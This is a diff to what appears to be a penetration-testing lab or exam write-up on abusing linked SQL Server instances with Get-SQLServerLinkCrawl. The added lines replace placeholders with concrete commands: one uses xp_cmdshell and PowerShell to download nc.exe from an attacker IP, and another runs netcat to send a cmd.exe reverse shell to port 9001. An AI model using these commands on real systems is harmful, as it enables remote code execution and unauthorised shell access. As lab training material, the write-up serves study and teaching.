@@ -33,16 +33,12 @@ Get-SQLServerLinkCrawl -Instance [instance] -Query 'exec master..xp_cmdshell "wh
 Now let’s try to upload nc.exe to the C:\Windows\Temp folder and execute it to give us a reverse shell 
 as devsqladmin
 ```
-Get-SQLServerLinkCrawl -Instance [instance] -Query 
-'exec master..xp_cmdshell "powershell iex (New-Object 
-Net.WebClient).DownloadFile(''http://[ip]/nc.exe'',''C:\Windows\Temp\
-nc.exe'')"'
+Get-SQLServerLinkCrawl -Instance ms01.oscp.exam -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile(''http://192.168.49.150/nc.exe'',''C:\Windows\Temp\nc.exe'')"'
 ```
 After nc.exe is successfully uploaded we can run the following command to execute it and send us 
 reverse shell on port 9001 and running cmd.exe
 ```
-Get-SQLServerLinkCrawl -Instance [instance] -Query 
-'exec master..xp_cmdshell "C:\Windows\Temp\nc.exe -e cmd [ip] 9001"'
+Get-SQLServerLinkCrawl -Instance ms01.oscp.exam -Query 'exec master..xp_cmdshell "C:\Windows\Temp\nc.exe 192.168.49.105 9001 -e cmd.exe"'
 ```
 Using the USER machine, we listen on port 9001 and successfully get a shell as user\devsqladmin
 ```
